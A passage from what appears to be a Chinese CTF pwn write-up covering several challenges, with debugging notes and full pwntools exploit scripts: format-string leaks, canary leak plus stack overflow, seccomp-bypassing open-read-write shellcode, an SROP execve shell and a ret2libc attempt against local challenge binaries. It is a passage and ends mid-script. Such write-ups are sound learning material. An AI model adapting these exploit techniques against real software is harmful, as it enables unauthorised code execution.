+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201720040.png" srcset="/img/loading.gif" lazyload alt="image-20240920172003963"></p>
+<p>exp:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./loginsystem&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">43911</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>password = <span class="hljs-number">0x404050</span><br><br>payload = b<span class="hljs-string">&quot;%9$sabcd&quot;</span>+p64(password)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>strs = rl()<br>strs = rl()<br>strs = u64(rl()[<span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span>])<br>print(hex(strs))<br><br>payload = p64(strs)<br>sd(payload)<br><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="15-Catch-the-canary"><a href="#15-Catch-the-canary" class="headerlink" title="15 Catch_the_canary!"></a>15 Catch_the_canary!</h4><p>第一步有个password的随机数猜测，搜了搜arc4random,每运行就会生成一次，找不到破绽（刚开始以为让scanf返回为-1就得了，其实不对，而且花了好久的时间找怎么让它-1也每找到，顶多不输入是0）最后：有while，重复输入判断，有固定值加取余，直接爆破不就得了。。。我真的。。。。。被自己蠢到了，浪费了好多时间。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201954424.png" srcset="/img/loading.gif" lazyload alt="image-20240920195423277"></p>
+<p>下面这段函数应该执行3次，但是我的循环终止条件写错了，导致调了半天。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202026591.png" srcset="/img/loading.gif" lazyload alt="image-20240920202629535"></p>
+<p>这个循环的第一次输入变成了循环的一次输入，循环多跑了一次。。</p>
+<p>原本以为循环终止条件写错了，怎么调都调不出来毛病，感觉对的呀，最终的问题：上面少接收了一行输出，导致下一轮才接收到正确的结果。。。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202038547.png" srcset="/img/loading.gif" lazyload alt="image-20240920203823504"></p>
+<p>提示的scanf+-来跳过输入，很常见了，白费了提示。</p>
+<p>剩下就是常规的puts泄露canary，栈溢出到后门</p>
+<p><del>良心玩家，不用打libc</del></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./mycanary&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45565</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x4012AD</span><br><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#sl(&#x27;32767&#x27;)</span><br>rl()<br>rl()<br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4014BA&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">9029</span>):<br>        <br>    password = <span class="hljs-number">16768186</span>+i<br>    sl(<span class="hljs-built_in">str</span>(password))<br>    strs=rl()<br>    <span class="hljs-built_in">print</span>(strs)<br>    <span class="hljs-keyword">if</span> strs == <span class="hljs-string">b&#x27;[Info] Cage opened.\n&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4014BA&#x27;)</span><br><br>sl(<span class="hljs-string">b&#x27;+&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;+&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;195874819&#x27;</span>)<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;B&#x27;</span><br>sd(payload)<br>ru(<span class="hljs-string">&#x27;AB&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>canary +=rc(<span class="hljs-number">7</span>)<br>canary = u64(canary)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x18</span>) + p64(canary)*<span class="hljs-number">2</span> + p64(back_addr)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="16-shellcode-revenge"><a href="#16-shellcode-revenge" class="headerlink" title="16 shellcode_revenge"></a>16 <strong>shellcode_revenge</strong></h4><p>沙箱禁了execve</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202114002.png" srcset="/img/loading.gif" lazyload alt="image-20240920211345249"></p>
+<p>一个小菜单，管理员登录，用户登录（这里没检查负数溢出，但是没有用），用户注册（没用），自行输入shellcode并执行，有用。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202322159.png" srcset="/img/loading.gif" lazyload alt="image-20240920232046998"></p>
+<p>密码是时间戳的伪随机数，直接上公式，登陆后level&#x3D;1，才能用operate执行shellcode</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202322455.png" srcset="/img/loading.gif" lazyload></p>
+<p>执行输入的shellcode。这里注意写shellcode时，不要随便用寄存器赋值来修改，因为环境变量可能不同！！！！</p>
+<p>重温shellcraft的调用</p>
+<p>只能读13字节，本来想分次orw，结果不够，那就shellcode执行read，再写orw，原本打算往这个已知地址的地方写，这会导致需要找地方写入（第一次加的地址太多了，写到了没有分配空间的地方），前面需要填nop来滑栈。但是往栈里写就好了（不用考虑是否存在这个空间。）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202323352.png" srcset="/img/loading.gif" lazyload alt="image-20240920232339267"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./shellcode_revenge&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,41169)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>dll=cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>seed =time.time()<br>a=<span class="hljs-built_in">int</span>(seed)<br>dll.srand(a)<br>admin_pwd = dll.rand()<br><br>rl()<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(admin_pwd))<br>rl()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">sl(b&#x27;3&#x27;)</span><br><span class="hljs-string">rl()</span><br><span class="hljs-string">sl(b&#x27;0&#x27;)</span><br><span class="hljs-string">rl()</span><br><span class="hljs-string">sd(&#x27;xyyr&#x27;)</span><br><span class="hljs-string">debug()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#ru(&#x27;Choose&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edx,0x100</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = asm(code).ljust(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(code))<br><span class="hljs-comment">#debug()</span><br>sd(code)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>shellcode += shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>code =<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">16</span>+ asm(shellcode)<br>sd(code)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">code = shellcraft.open(&quot;.&quot;)</span><br><span class="hljs-string">code += shellcraft.getdents(&#x27;eax&#x27;,&#x27;rsp&#x27;, 4096)</span><br><span class="hljs-string">code += shellcraft.write(1,&#x27;rsp&#x27;,4096)</span><br><span class="hljs-string">shellcode = b&#x27;\x90&#x27;*16+asm(code)</span><br><span class="hljs-string">sd(shellcode)</span><br><span class="hljs-string"></span><br><span class="hljs-string">all = p.recv(4096)</span><br><span class="hljs-string">index = all.find(&#x27;flag&#x27;)</span><br><span class="hljs-string">flagname = all[index:index+9]</span><br><span class="hljs-string">success(flagname)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="17-pwn-it-off"><a href="#17-pwn-it-off" class="headerlink" title="17 pwn_it_off"></a>17 pwn_it_off</h4><p>本函数要填入之间随机数生成的密码，由于是固定的距离rbp的距离，所以产生的密码的位置是一致的，gdb动调找到对应的行。白色的部分即为密码，也就是第二次输出的对应位置，接收后发送即可。这里其实是最后一次生成的这个位置，也就是最后一次发送的密码的白色位置。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211535725.png" srcset="/img/loading.gif" lazyload alt="image-20240921153551600"></p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211534543.png" srcset="/img/loading.gif" lazyload alt="image-20240921153455446"></p>
+<p>第二层还是老样子，最后一次输出的这个位置</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211556221.png" srcset="/img/loading.gif" lazyload alt="image-20240921155637175"></p>
+<p>后几位是这个数，但是前面的位在这里无法输入，需要在第一次输入进去，发现能覆盖到v1[1],只要把v1[0]与v1[1]输成一样的就行。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211608118.png" srcset="/img/loading.gif" lazyload alt="image-20240921160806072"></p>
+<p>这么覆写后发现，对数大小的检测过不去了</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211630431.png" srcset="/img/loading.gif" lazyload alt="image-20240921163037367"></p>
+<p>有了，该死的要用产生的密码的提示。。。。。。。。。</p>
+<p>我直接覆盖成定值，输入定值不久得了。。。</p>
+<p>总是输入不进去，才发现这里给read的超了1个字节，只有0x17来着</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211642908.png" srcset="/img/loading.gif" lazyload alt="image-20240921164253872"></p>
+<p>改成p32后覆盖不全，再多加一个\x00就成了。</p>
+<p>至于为什么选第三次作为最后一次–》第三次随机出来的情况最多，而且方便。至于哪儿方便了—-试试就知道了。</p>
+<p>exp：</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br>p=process(&#x27;./alarm&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=remote(&#x27;127.0.0.1&#x27;,)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>space1 = p.recv(0x3f)<br>space1 = p.recv(0x3f)<br>print(b&quot;this is +++ &quot;+ space1)<br>space2 = rc(0x18+4)<br>print(b&#x27;this is --- &#x27;+ space2)<br>pwd1 = rc(15)<br>print(b&#x27;the pwd is&#x27;+pwd1)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sd</span><span class="hljs-params">(&#x27;\<span class="hljs-variable">n</span>&#x27;)</span><br>pwd1 +=b&#x27;\x00&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sd</span><span class="hljs-params">(<span class="hljs-variable">pwd1</span>)</span><br>rc(2)<br>pwd2 = rc(1)<br>print(b&#x27;the pwd2 is &#x27;)<br>print(pwd2)<br>pwd = pwd1 + p32(0x2710)+b&#x27;\x00&#x27;<br>sd(pwd)<br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *main+43&#x27;)<br><br>ru(b&#x27;Input the numeric password&#x27;)<br>sl(b&#x27;10000&#x27;)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="18-return15"><a href="#18-return15" class="headerlink" title="18 return15"></a>18 return15</h4><p>栈溢出+srop，bin_sh地址都给了，忘截图了，很简单，有手就行。</p>
+<p>exp:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./return15&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">39743</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>bin_sh =  <span class="hljs-number">0x0402008</span><br>syscall = <span class="hljs-number">0x000000000040111c</span><br>sigret = <span class="hljs-number">0x40110A</span><br><br>frame = <span class="hljs-title class_">SigreturnFrame</span>()<br>frame.rax = constants.SYS_execve<br>frame.rdi = bin_sh<br>frame.rsi = <span class="hljs-number">0</span> <br>frame.rdx = <span class="hljs-number">0</span> <br>frame.rip = syscall<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x28</span> + p64(sigret) + p64(syscall) + bytes(frame)<br>sd(payload)<br><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="19-VisibleInput"><a href="#19-VisibleInput" class="headerlink" title="19 VisibleInput"></a>19 <strong>VisibleInput</strong></h4><p>写shellcode并执行，但是有了检测，这些机器码要变通着来。（其实就是要用可见字符写shellcode）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211723129.png" srcset="/img/loading.gif" lazyload alt="image-20240921172341054"></p>
+<p>搓64位shellcode，下载了alpha3，但是运行报错。</p>
+<p>试了好多种工具，都在运行的时候报错，放弃挣扎</p>
+<h4 id="20-system-not-found"><a href="#20-system-not-found" class="headerlink" title="20  system_not_found"></a>20  system_not_found</h4><p>可以覆盖nbytes使得第二次输入栈溢出，结果pop链里没有pop|rdi，不过还好出题人给了libc文件，改libc从本地环境里找偏移。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221643880.png" srcset="/img/loading.gif" lazyload alt="image-20240922164339686"></p>
+<p>这里注意到%s，%s不是第三层嘛，然后看了看以前的输出，发现从寄存器输出要比栈输出少一层。如果是%p的话，寄存器直接把值输出，栈是第二层。（想着用%s输出的做法被打消了。。）</p>
+<p>红框分别代表一层</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221720115.png" srcset="/img/loading.gif" lazyload alt="image-20240922172024046"></p>
+<p>0只会把最后一个字节置为0，地址的话没有影响（因为本身就输入了0）</p>
+<p>注意到这里的参数跟rbp有关，pop链里有pop rbp，那把rbp改了就可以输出值了。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221737200.png" srcset="/img/loading.gif" lazyload alt="image-20240922173710140"></p>
+<p>这样子可以输出libc真实地址，但是就不能后续就不能正常输入了。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221740725.png" srcset="/img/loading.gif" lazyload alt="image-20240922174012690"></p>
+<p>那换个思路，给后面的printf换成one_gad_get不久好了，不过还得再算算到哪儿可以正常往里读入。</p>
+<p>v6是rbp-0x28</p>
+<p>buf是rbp-0x40</p>
+<p>找偏移中，如果直接跟基地址减的话，发现偏移不一致（取得不是直接函数里的，因为距离不够）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222126301.png" srcset="/img/loading.gif" lazyload alt="image-20240922212630221"></p>
+<p>除去0之后都是差0x300000（有时候是0x200000.。。。。）</p>
+<p>经多次检验后正常，准备尝试改got表打onegadget</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222206631.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是onegadget的条件，好多要求可写。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222217920.png" srcset="/img/loading.gif" lazyload alt="image-20240922221747874"></p>
+<p>这里可以看到ret回的地方是这里</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222213767.png" srcset="/img/loading.gif" lazyload alt="image-20240922221345723"></p>
+<p>本来想凑凑第二个，结果突然发现rbp已经是0了，第一个更好凑。</p>
+<p>想要溢出到这里，但是后面还有printf，这里保护了printf正常执行，但printf执行的过程中卡死了。。看看提示去</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222237799.png" srcset="/img/loading.gif" lazyload alt="image-20240922223717209"></p>
+<p>没啥子用。。。不对，第二个有用！</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222238308.png" srcset="/img/loading.gif" lazyload alt="image-20240922223841272"></p>
+<p>rdi里的值可以直接输出得到libc地址，不用绕这么多圈去从bss打印。。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222241496.png" srcset="/img/loading.gif" lazyload alt="image-20240922224152445"></p>
+<p>阿里嘎多提示酱，我真真真不会注意这种地方，绕了大圈子。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./dialogue&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46211</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>puts_plt = <span class="hljs-number">0x401040</span><br>main_addr = <span class="hljs-number">0x04011E1</span><br>bss_got = <span class="hljs-number">0x403FF0</span> + <span class="hljs-number">0x40</span><br>pop_rbp = <span class="hljs-number">0x000000000040115d</span><br>pop_ret = <span class="hljs-number">0x000000000040101a</span><br>payload = p64(bss_got)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x200</span>)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>rl()<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x30</span>+p64(puts_plt)+p64(main_addr)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>recv_addr = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(recv_addr))<br>libc_base = recv_addr - (<span class="hljs-number">0x7fbf12662050</span> - <span class="hljs-number">0x7fbf12600000</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">print(libc.sym[&#x27;puts&#x27;])</span><br><span class="hljs-string">libc_base = recv_addr &amp; 0xfffffff00000 </span><br><span class="hljs-string">libc_base = libc_base - 0x300000</span><br><span class="hljs-string">print(hex(libc_base))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>printf_addr = libc_base + libc.sym[<span 